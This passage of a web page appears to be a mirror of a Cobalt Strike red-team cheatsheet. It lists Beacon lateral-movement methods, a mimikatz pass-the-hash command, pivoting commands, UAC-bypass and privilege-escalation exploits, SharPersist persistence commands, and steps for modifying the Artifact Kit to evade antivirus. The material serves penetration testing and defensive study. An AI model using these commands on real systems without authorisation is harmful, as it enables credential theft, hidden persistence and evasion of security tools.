    </span><span class="n">psexec_psh</span><span class="w">	</span><span class="nx">x86</span><span class="w">	</span><span class="nx">Use</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">PowerShell</span><span class="w"> </span><span class="nx">one-liner</span><span class="w">
    </span><span class="n">winrm</span><span class="w">	</span><span class="nx">x86</span><span class="w">	</span><span class="nx">Run</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">PowerShell</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="nx">via</span><span class="w"> </span><span class="nx">WinRM</span><span class="w">
    </span><span class="n">winrm64</span><span class="w">	</span><span class="nx">x64</span><span class="w">	</span><span class="nx">Run</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">PowerShell</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="nx">via</span><span class="w"> </span><span class="nx">WinRM</span><span class="w">

</span><span class="n">Beacon</span><span class="w"> </span><span class="nx">Remote</span><span class="w"> </span><span class="nx">Execute</span><span class="w"> </span><span class="nx">Methods</span><span class="w">
</span><span class="o">=============================</span><span class="w">
</span><span class="n">remote-exec</span><span class="w"> </span><span class="p">[</span><span class="n">module</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">target</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">command</span><span class="p">]</span><span class="w"> 

    </span><span class="n">Methods</span><span class="w">                         </span><span class="nx">Description</span><span class="w">
    </span><span class="o">-------</span><span class="w">                         </span><span class="o">-----------</span><span class="w">
    </span><span class="n">psexec</span><span class="w">                          </span><span class="nx">Remote</span><span class="w"> </span><span class="nx">execute</span><span class="w"> </span><span class="nx">via</span><span class="w"> </span><span class="nx">Service</span><span class="w"> </span><span class="nx">Control</span><span class="w"> </span><span class="nx">Manager</span><span class="w">
    </span><span class="n">winrm</span><span class="w">                           </span><span class="nx">Remote</span><span class="w"> </span><span class="nx">execute</span><span class="w"> </span><span class="nx">via</span><span class="w"> </span><span class="nx">WinRM</span><span class="w"> </span><span class="p">(</span><span class="n">PowerShell</span><span class="p">)</span><span class="w">
    </span><span class="n">wmi</span><span class="w">                             </span><span class="nx">Remote</span><span class="w"> </span><span class="nx">execute</span><span class="w"> </span><span class="nx">via</span><span class="w"> </span><span class="nx">WMI</span><span class="w"> </span><span class="p">(</span><span class="n">PowerShell</span><span class="p">)</span><span class="w">

</span></pre></td></tr></tbody></table></code></div></div>

<p>Opsec safe Pass-the-Hash:</p>
<ol>
  <li><code class="language-plaintext highlighter-rouge">mimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:"powershell -w hidden"</code></li>
  <li><code class="language-plaintext highlighter-rouge">steal_token PID</code></li>
</ol>

<h3 id="assume-control-of-artifact">Assume Control of Artifact</h3>

<ul>
  <li>Use <code class="language-plaintext highlighter-rouge">link</code> to connect to SMB Beacon</li>
  <li>Use <code class="language-plaintext highlighter-rouge">connect</code> to connect to TCP Beacon</li>
</ul>

<h2 id="vpn--pivots">VPN &amp; Pivots</h2>

<p>:warning: Covert VPN doesn’t work with W10, and requires Administrator access to deploy.</p>

<blockquote>
  <p>Use socks 8080 to setup a SOCKS4a proxy server on port 8080 (or any other port you choose). This will setup a SOCKS proxy server to tunnel traffic through Beacon. Beacon’s sleep time adds latency to any traffic you tunnel through it. Use sleep 0 to make Beacon check-in several times a second.</p>
</blockquote>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="c"># Start a SOCKS server on the given port on your teamserver, tunneling traffic through the specified Beacon. Set the teamserver/port configuration in /etc/proxychains.conf for easy usage.</span><span class="w">
</span><span class="n">beacon</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">socks</span><span class="w"> </span><span class="p">[</span><span class="n">PORT</span><span class="p">]</span><span class="w">

</span><span class="c"># Proxy browser traffic through a specified Internet Explorer process.</span><span class="w">
</span><span class="n">beacon</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">browserpivot</span><span class="w"> </span><span class="p">[</span><span class="n">pid</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">x86</span><span class="o">|</span><span class="n">x64</span><span class="p">]</span><span class="w">

</span><span class="c"># Bind to the specified port on the Beacon host, and forward any incoming connections to the forwarded host and port.</span><span class="w">
</span><span class="n">beacon</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">rportfwd</span><span class="w"> </span><span class="p">[</span><span class="n">bind</span><span class="w"> </span><span class="n">port</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">forward</span><span class="w"> </span><span class="n">host</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">forward</span><span class="w"> </span><span class="n">port</span><span class="p">]</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="kits">Kits</h2>

<h3 id="elevate-kit">Elevate Kit</h3>

<p>UAC Token Duplication : Fixed in Windows 10 Red Stone 5 (October 2018)</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="n">beacon</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">runasadmin</span><span class="w">

</span><span class="n">Beacon</span><span class="w"> </span><span class="nx">Command</span><span class="w"> </span><span class="nx">Elevators</span><span class="w">
</span><span class="o">========================</span><span class="w">

    </span><span class="n">Exploit</span><span class="w">                         </span><span class="nx">Description</span><span class="w">
    </span><span class="o">-------</span><span class="w">                         </span><span class="o">-----------</span><span class="w">
    </span><span class="n">ms14-058</span><span class="w">                        </span><span class="nx">TrackPopupMenu</span><span class="w"> </span><span class="nx">Win32k</span><span class="w"> </span><span class="nx">NULL</span><span class="w"> </span><span class="nx">Pointer</span><span class="w"> </span><span class="nx">Dereference</span><span class="w"> </span><span class="p">(</span><span class="n">CVE-2014-4113</span><span class="p">)</span><span class="w">
    </span><span class="n">ms15-051</span><span class="w">                        </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">ClientCopyImage</span><span class="w"> </span><span class="nx">Win32k</span><span class="w"> </span><span class="nx">Exploit</span><span class="w"> </span><span class="p">(</span><span class="n">CVE</span><span class="w"> </span><span class="nx">2015-1701</span><span class="p">)</span><span class="w">
    </span><span class="n">ms16-016</span><span class="w">                        </span><span class="nx">mrxdav.sys</span><span class="w"> </span><span class="nx">WebDav</span><span class="w"> </span><span class="nx">Local</span><span class="w"> </span><span class="nx">Privilege</span><span class="w"> </span><span class="nx">Escalation</span><span class="w"> </span><span class="p">(</span><span class="n">CVE</span><span class="w"> </span><span class="nx">2016-0051</span><span class="p">)</span><span class="w">
    </span><span class="n">svc-exe</span><span class="w">                         </span><span class="nx">Get</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="nx">via</span><span class="w"> </span><span class="nx">an</span><span class="w"> </span><span class="nx">executable</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nx">as</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">service</span><span class="w">
    </span><span class="n">uac-schtasks</span><span class="w">                    </span><span class="nx">Bypass</span><span class="w"> </span><span class="nx">UAC</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">schtasks.exe</span><span class="w"> </span><span class="p">(</span><span class="n">via</span><span class="w"> </span><span class="nx">SilentCleanup</span><span class="p">)</span><span class="w">
    </span><span class="n">uac-token-duplication</span><span class="w">           </span><span class="nx">Bypass</span><span class="w"> </span><span class="nx">UAC</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">Token</span><span class="w"> </span><span class="nx">Duplication</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="persistence-kit">Persistence Kit</h3>

<ul>
  <li>https://github.com/0xthirteen/MoveKit</li>
  <li>https://github.com/fireeye/SharPersist
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="c"># List persistences</span><span class="w">
  </span><span class="n">SharPersist</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">schtaskbackdoor</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">list</span><span class="w">
  </span><span class="n">SharPersist</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">startupfolder</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">list</span><span class="w">
  </span><span class="n">SharPersist</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">schtask</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">list</span><span class="w">

  </span><span class="c"># Add a persistence</span><span class="w">
  </span><span class="n">SharPersist</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">schtaskbackdoor</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"C:\Windows\System32\cmd.exe"</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="s2">"/c calc.exe"</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="s2">"Something Cool"</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">add</span><span class="w">
  </span><span class="n">SharPersist</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">schtaskbackdoor</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="s2">"Something Cool"</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">remove</span><span class="w">

  </span><span class="n">SharPersist</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"C:\Windows\System32\cmd.exe"</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="s2">"/c calc.exe"</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="s2">"Some Service"</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">add</span><span class="w">
  </span><span class="n">SharPersist</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="s2">"Some Service"</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">remove</span><span class="w">

  </span><span class="n">SharPersist</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">schtask</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"C:\Windows\System32\cmd.exe"</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="s2">"/c calc.exe"</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="s2">"Some Task"</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">add</span><span class="w">
  </span><span class="n">SharPersist</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">schtask</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"C:\Windows\System32\cmd.exe"</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="s2">"/c calc.exe"</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="s2">"Some Task"</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">hourly</span><span class="w">
  </span><span class="n">SharPersist</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">schtask</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="s2">"Some Task"</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">remove</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h3 id="resource-kit">Resource Kit</h3>

<blockquote>
  <p>The Resource Kit is Cobalt Strike’s means to change the HTA, PowerShell, Python, VBA, and VBS script templates Cobalt Strike uses in its workflows</p>
</blockquote>

<h3 id="artifact-kit">Artifact Kit</h3>

<blockquote>
  <p>Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -&gt; Script Manager, and load the artifact.cna script from that technique’s folder.</p>
</blockquote>

<p>Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :</p>

<ul>
  <li>Download the artifact kit : <code class="language-plaintext highlighter-rouge">Go to Help -&gt; Arsenal to download Artifact Kit (requires a licensed version of Cobalt Strike)</code></li>
  <li>Install the dependencies : <code class="language-plaintext highlighter-rouge">sudo apt-get install mingw-w64</code></li>
  <li>Edit the Artifact code
    <ul>
      <li>Change pipename strings</li>
      <li>Change <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> in <code class="language-plaintext highlighter-rouge">patch.c</code>/<code class="language-plaintext highlighter-rouge">patch.exe</code>, e.g: HeapAlloc</li>
      <li>Change Import</li>
    </ul>
  </li>
  <li>Build the Artifact</li>
  <li>Cobalt Strike -&gt; Script Manager &gt; Load .cna</li>
</ul>

<h2 id="references">References</h2>

<ul>
  <li><a href="https://www.youtube.com/watch?v=q7VQeK533zI">Red Team Ops with Cobalt Strike (1 of 9): Operations</a></li>
  <li><a href="https://www.youtube.com/watch?v=5gwEMocFkc0">Red Team Ops with Cobalt Strike (2 of 9): Infrastructure</a></li>
  <li><a href="https://www.youtube.com/watch?v=Z8n9bIPAIao">Red Team Ops with Cobalt Strike (3 of 9): C2</a></li>
  <li><a href="https://www.youtube.com/watch?v=H0_CKdwbMRk">Red Team Ops with Cobalt Strike (4 of 9): Weaponization</a></li>
  <li><a href="https://www.youtube.com/watch?v=bYt85zm4YT8">Red Team Ops with Cobalt Strike (5 of 9): Initial Access</a></li>
  <li><a href="https://www.youtube.com/watch?v=Pb6yvcB2aYw">Red Team Ops with Cobalt Strike (6 of 9): Post Exploitation</a></li>
  <li><a href="https://www.youtube.com/watch?v=lzwwVwmG0io">Red Team Ops with Cobalt Strike (7 of 9): Privilege Escalation</a></li>
  <li><a href="https://www.youtube.com/watch?v=QF_6zFLmLn0">Red Team Ops with Cobalt Strike (8 of 9): Lateral Movement</a></li>
  <li><a href="https://www.youtube.com/watch?v=sP1HgUu7duU&amp;list=PL9HO6M_MU2nfQ4kHSCzAQMqxQxH47d1no&amp;index=10&amp;t=0s">Red Team Ops with Cobalt Strike (9 of 9): Pivoting</a></li>
  <li><a href="https://posts.specterops.io/a-deep-dive-into-cobalt-strike-malleable-c2-6660e33b0e0b">A Deep Dive into Cobalt Strike Malleable C2 - Joe Vest - Sep 5, 2018 </a></li>
  <li><a href="https://www.pentestpartners.com/security-blog/cobalt-strike-walkthrough-for-red-teamers/">Cobalt Strike. Walkthrough for Red Teamers - Neil Lines - 15 Apr 2019</a></li>
  <li><a href="https://holdmybeersecurity.com/2018/11/25/tales-of-a-red-teamer-how-to-setup-a-c2-infrastructure-for-cobalt-strike-ub-2018/">TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE – UB 2018 - NOV 25 2018</a></li>
  <li><a href="https://www.cobaltstrike.com/help-dns-beacon">Cobalt Strike - DNS Beacon</a></li>
  <li><a href="https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/">How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017</a></li>
</ul>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        
        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/methodology-and-resource/'>Methodology and Resource</a>,
            <a href='/categories/cheatsheet/'>Cheatsheet</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/exploit/"
            class="post-tag no-text-decoration" >Exploit</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          
          <div class="license-wrapper">
            This post is licensed under
            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
            by the author.
          </div>
          

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Cobalt strike   cheatsheet - PayloadsAllTheThings&url=http://localhost:4000/Cobalt-Strike-Cheatsheet/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Cobalt strike   cheatsheet - PayloadsAllTheThings&u=http://localhost:4000/Cobalt-Strike-Cheatsheet/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=Cobalt strike   cheatsheet - PayloadsAllTheThings&url=http://localhost:4000/Cobalt-Strike-Cheatsheet/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink()"
        data-toggle="tooltip" data-placement="top" title="Copy link"></i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->

<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/Upload-Insecure-Files/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Mar 30, 2021
  

  <i class="unloaded">2021-03-30T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Upload Insecure Files</h3>
            <div class="text-muted small">
              <p>
                





                Upload

Uploaded files may pose a significant risk if not handled correctly. A remote attacker could send a multipart/form-data POST request with a specially-crafted filename or mime type and execu...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/Reverse-Shell-Cheatsheet/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Apr 26, 2021
  

  <i class="unloaded">2021-04-26T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Reverse Shell Cheat Sheet</h3>
            <div class="text-muted small">
              <p>
                





                Summary


  Reverse Shell
    
      Awk
      Automatic Reverse Shell Generator
      Bash TCP
      Bash UDP
      C
      Dart
      Golang
      Groovy Alternative 1
      Groovy
      Java Alt...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/MSSQL-Server-Cheatsheet/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Mar 25, 2021
  

  <i class="unloaded">2021-03-25T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Mssql server   cheatsheet</h3>
            <div class="text-muted small">
              <p>
                





                MSSQL Server

Summary


  Identify Instances and Databases
    
      Discover Local SQL Server Instances
      Discover Domain SQL Server Instances
      Discover Remote SQL Server Instances
     ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
